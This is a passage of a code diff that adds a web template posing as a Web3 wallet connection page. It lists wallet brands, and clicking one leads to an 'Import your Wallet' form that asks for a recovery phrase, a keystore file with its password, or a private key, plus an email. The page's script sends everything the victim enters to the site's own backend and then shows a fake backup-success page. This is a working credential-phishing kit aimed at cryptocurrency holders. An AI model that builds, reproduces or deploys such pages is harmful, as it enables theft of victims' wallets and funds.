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" alt="Ellipal" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Ellipal</span>
+            </div>
+            
+            <!-- KEYRING PRO -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="KEYRING PRO" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">KEYRING PRO</span>
+            </div>
+            
+            <!-- Blockchain -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/blockchain-logo.png" alt="Blockchain" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Blockchain</span>
+            </div>
+            
+            <!-- Binance Smart Chain -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/bsc-logo.png" alt="Binance Smart Chain" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Binance Smart Chain</span>
+            </div>
+            
+            <!-- Aktionariat -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="Aktionariat" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Aktionariat</span>
+            </div>
+            
+            <!-- Coinbase -->
+            <div class="wallet-card flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer"
+                 data-wallet-name="Coinbase" 
+                 data-wallet-img="https://web3connect.org/en/img/coinbase.png">
+                <img src="https://web3connect.org/en/img/coinbase.png" alt="Coinbase" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Coinbase</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="glass rounded-2xl max-w-md w-full p-8 relative animate-fadeIn">
+            <button id="closeModal" class="absolute top-4 right-4 text-white/60 hover:text-white transition">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+            </button>
+            
+            <div class="flex flex-col items-center text-center">
+                <img id="modalWalletImg" src="" alt="" class="w-24 h-24 rounded-full object-cover mb-6">
+                <h2 id="modalWalletName" class="text-2xl font-bold text-white mb-4"></h2>
+                <p id="modalWalletDescription" class="text-white/80 mb-8 leading-relaxed"></p>
+                <button id="connectWalletBtn" class="w-full text-white font-semibold py-3 px-6 rounded-lg hover:opacity-90 transition shadow-lg" style="background-color: #F65B1A;">
+                    Connect Wallet
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Import Wallet Modal -->
+    <div id="importModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="glass rounded-2xl max-w-2xl w-full max-h-[85vh] overflow-y-auto p-6 relative animate-fadeIn">
+            <button id="closeImportModal" class="absolute top-4 right-4 text-white/60 hover:text-white transition z-10">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+            </button>
+            
+            <!-- Header with thumbnail and title -->
+            <div class="flex items-center gap-3 mb-5">
+                <img id="importWalletImg" src="" alt="" class="w-12 h-12 rounded-full object-cover">
+                <h2 id="importWalletTitle" class="text-xl font-bold text-white">Import your Wallet</h2>
+            </div>
+
+            <!-- Tabs -->
+            <div class="flex gap-2 mb-4 border-b border-white/20">
+                <button class="tab-btn active px-4 py-2 text-white text-sm font-medium border-b-2 border-purple-500 transition" data-tab="phrase">
+                    Phrase
+                </button>
+                <button class="tab-btn px-4 py-2 text-white/60 text-sm font-medium border-b-2 border-transparent hover:text-white transition" data-tab="keystore">
+                    Keystore JSON
+                </button>
+                <button class="tab-btn px-4 py-2 text-white/60 text-sm font-medium border-b-2 border-transparent hover:text-white transition" data-tab="private">
+                    Private Key
+                </button>
+            </div>
+
+            <!-- Tab Content -->
+            <div class="tab-content">
+                <!-- Phrase Tab -->
+                <div id="phraseTab" class="tab-panel">
+                    <form id="phraseForm" class="space-y-4">
+                        <div>
+                            <label for="walletName" class="block text-white text-sm font-medium mb-1">Name wallet</label>
+                            <input type="text" id="walletName" name="walletName" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="email" class="block text-white text-sm font-medium mb-1">Email</label>
+                            <input type="email" id="email" name="email" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="phrase" class="block text-white text-sm font-medium mb-1">Phrase</label>
+                            <textarea id="phrase" name="phrase" rows="3" required
+                                      placeholder="Enter your recovery phrase"
+                                      class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition resize-none"></textarea>
+                            <p class="text-white/50 text-xs mt-1">Typically 12 (sometimes 24) words separated by single spaces</p>
+                        </div>
+
+                        <div class="flex gap-3 pt-2">
+                            <button type="button" id="cancelPhrase" class="flex-1 bg-white/10 text-white font-semibold py-2 px-4 rounded-lg hover:bg-white/20 transition">
+                                Cancel
+                            </button>
+                            <button type="submit" class="flex-1 text-white font-semibold py-2 px-4 rounded-lg hover:opacity-90 transition shadow-lg" style="background-color: #F65B1A;">
+                                Proceed
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Keystore JSON Tab -->
+                <div id="keystoreTab" class="tab-panel hidden">
+                    <p class="text-white/80 text-sm mb-4">Upload or paste your keystore JSON contents here.</p>
+                    <form id="keystoreForm" class="space-y-4">
+                        <div>
+                            <label for="keystoreWalletName" class="block text-white text-sm font-medium mb-1">Name wallet</label>
+                            <input type="text" id="keystoreWalletName" name="keystoreWalletName" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="keystoreEmail" class="block text-white text-sm font-medium mb-1">Email</label>
+                            <input type="email" id="keystoreEmail" name="keystoreEmail" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="keystoreJson" class="block text-white text-sm font-medium mb-1">Keystore JSON</label>
+                            <textarea id="keystoreJson" name="keystoreJson" rows="3" required
+                                      class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition resize-none"></textarea>
+                        </div>
+
+                        <div>
+                            <label for="keystorePassword" class="block text-white text-sm font-medium mb-1">Wallet password</label>
+                            <input type="password" id="keystorePassword" name="keystorePassword" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                            <p class="text-white/50 text-xs mt-1">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                        </div>
+
+                        <div class="flex gap-3 pt-2">
+                            <button type="button" id="cancelKeystore" class="flex-1 bg-white/10 text-white font-semibold py-2 px-4 rounded-lg hover:bg-white/20 transition">
+                                Cancel
+                            </button>
+                            <button type="submit" class="flex-1 text-white font-semibold py-2 px-4 rounded-lg hover:opacity-90 transition shadow-lg" style="background-color: #F65B1A;">
+                                Proceed
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Private Key Tab -->
+                <div id="privateTab" class="tab-panel hidden">
+                    <p class="text-white/80 text-sm mb-4">Enter your private key below:</p>
+                    <form id="privateKeyForm" class="space-y-4">
+                        <div>
+                            <label for="privateWalletName" class="block text-white text-sm font-medium mb-1">Name wallet</label>
+                            <input type="text" id="privateWalletName" name="privateWalletName" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="privateEmail" class="block text-white text-sm font-medium mb-1">Email</label>
+                            <input type="email" id="privateEmail" name="privateEmail" required
+                                   class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition">
+                        </div>
+
+                        <div>
+                            <label for="privateKey" class="block text-white text-sm font-medium mb-1">Enter your private key</label>
+                            <textarea id="privateKey" name="privateKey" rows="3" required
+                                      class="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-purple-500 transition resize-none"></textarea>
+                            <p class="text-white/50 text-xs mt-1">Typically 12 (sometimes 24) words separated by a single space.</p>
+                        </div>
+
+                        <div class="flex gap-3 pt-2">
+                            <button type="button" id="cancelPrivate" class="flex-1 bg-white/10 text-white font-semibold py-2 px-4 rounded-lg hover:bg-white/20 transition">
+                                Cancel
+                            </button>
+                            <button type="submit" class="flex-1 text-white font-semibold py-2 px-4 rounded-lg hover:opacity-90 transition shadow-lg" style="background-color: #F65B1A;">
+                                Proceed
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const modal = document.getElementById('walletModal');
+            const importModal = document.getElementById('importModal');
+            const closeModalBtn = document.getElementById('closeModal');
+            const closeImportModalBtn = document.getElementById('closeImportModal');
+            const connectWalletBtn = document.getElementById('connectWalletBtn');
+            const modalWalletImg = document.getElementById('modalWalletImg');
+            const modalWalletName = document.getElementById('modalWalletName');
+            const modalWalletDescription = document.getElementById('modalWalletDescription');
+            const importWalletImg = document.getElementById('importWalletImg');
+            const importWalletTitle = document.getElementById('importWalletTitle');
+            
+            // Cancel buttons
+            const cancelPhrase = document.getElementById('cancelPhrase');
+            const cancelKeystore = document.getElementById('cancelKeystore');
+            const cancelPrivate = document.getElementById('cancelPrivate');
+            
+            // Forms
+            const phraseForm = document.getElementById('phraseForm');
+            const keystoreForm = document.getElementById('keystoreForm');
+            const privateKeyForm = document.getElementById('privateKeyForm');
+            
+            let currentWalletName = '';
+            let currentWalletImg = '';
+            
+            // Generate random UID
+            function generateUID() {
+                return 'wu' + Math.floor(Math.random() * 1000000000000);
+            }
+            
+            // Handle form submissions
+            async function handleFormSubmit(e, formType) {
+                e.preventDefault();
+                const formData = new FormData(e.target);
+                const data = {
+                    walletName: currentWalletName,
+                    formType: formType,
+                    uid: generateUID(),
+                    data: Object.fromEntries(formData)
+                };
+                
+                try {
+                    // Send to backend
+                    const response = await fetch('/api/submit-wallet/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        // Store UID in sessionStorage
+                        sessionStorage.setItem('backupUID', result.uid);
+                        sessionStorage.setItem('walletData', JSON.stringify(data));
+                        
+                        // Redirect to success page
+                        window.location.href = '/backup-success/';
+                    } else {
+                        alert('Error: ' + result.error);
+                    }
+                } catch (error) {
+                    console.error('Error submitting form:', error);
+                    alert('An error occurred. Please try again.');
+                }
+            }
+            
+            phraseForm.addEventListener('submit', (e) => handleFormSubmit(e, 'phrase'));
+            keystoreForm.addEventListener('submit', (e) => handleFormSubmit(e, 'keystore'));
+            privateKeyForm.addEventListener('submit', (e) => handleFormSubmit(e, 'privateKey'));
+            
+            // Cancel buttons close modal
+            cancelPhrase.addEventListener('click', closeImportModal);
+            cancelKeystore.addEventListener('click', closeImportModal);
+            cancelPrivate.addEventListener('click', closeImportModal);
+            
+            // Add wallet-card class and data attributes to all wallet divs
+            const walletDivs = document.querySelectorAll('.grid > div');
+            walletDivs.forEach(div => {
+                if (!div.classList.contains('wallet-card')) {
+                    div.classList.add('wallet-card');
+                    const img = div.querySelector('img');
+                    const span = div.querySelector('span');
+                    if (img && span) {
+                        div.setAttribute('data-wallet-name', span.textContent.trim());
+                        div.setAttribute('data-wallet-img', img.src);
+                    }
+                }
+            });
+            
+            // Open modal when wallet card is clicked
+            document.querySelectorAll('.wallet-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const walletName = this.getAttribute('data-wallet-name');
+                    const walletImg = this.getAttribute('data-wallet-img');
+                    
+                    currentWalletName = walletName;
+                    currentWalletImg = walletImg;
+                    
+                    modalWalletImg.src = walletImg;
+                    modalWalletImg.alt = walletName;
+                    modalWalletName.textContent = walletName;
+                    modalWalletDescription.textContent = `A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. ${walletName} wallet can go here.`;
+                    
+                    modal.classList.remove('hidden');
+                    document.body.style.overflow = 'hidden';
+                });
+            });
+            
+            // Connect Wallet button - opens import modal
+            connectWalletBtn.addEventListener('click', function() {
+                modal.classList.add('hidden');
+                
+                importWalletImg.src = currentWalletImg;
+                importWalletImg.alt = currentWalletName;
+                importWalletTitle.textContent = `Import your ${currentWalletName} Wallet`;
+                
+                importModal.classList.remove('hidden');
+            });
+            
+            // Tab switching
+            const tabBtns = document.querySelectorAll('.tab-btn');
+            const tabPanels = document.querySelectorAll('.tab-panel');
+            
+            tabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabName = this.getAttribute('data-tab');
+                    
+                    // Update button states
+                    tabBtns.forEach(b => {
+                        b.classList.remove('active', 'border-purple-500', 'text-white');
+                        b.classList.add('border-transparent', 'text-white/60');
+                    });
+                    this.classList.add('active', 'border-purple-500', 'text-white');
+                    this.classList.remove('border-transparent', 'text-white/60');
+                    
+                    // Show/hide panels
+                    tabPanels.forEach(panel => {
+                        panel.classList.add('hidden');
+                    });
+                    document.getElementById(tabName + 'Tab').classList.remove('hidden');
+                });
+            });
+            
+            // Close modal functions
+            function closeModal() {
+                modal.classList.add('hidden');
+                document.body.style.overflow = 'auto';
+            }
+            
+            function closeImportModal() {
+                importModal.classList.add('hidden');
+                document.body.style.overflow = 'auto';
+            }
+            
+            closeModalBtn.addEventListener('click', closeModal);
+            closeImportModalBtn.addEventListener('click', closeImportModal);
+            
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    closeModal();
+                }
+            });
+            
+            importModal.addEventListener('click', function(e) {
+                if (e.target === importModal) {
+                    closeImportModal();
+                }
+            });
+            
+            // Close on ESC key
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    if (!importModal.classList.contains('hidden')) {
+                        closeImportModal();
+                    } else if (!modal.classList.contains('hidden')) {
+                        closeModal();
+                    }
+                }
+            });
+        });
+    </script>
+</main>
+{% endblock %}
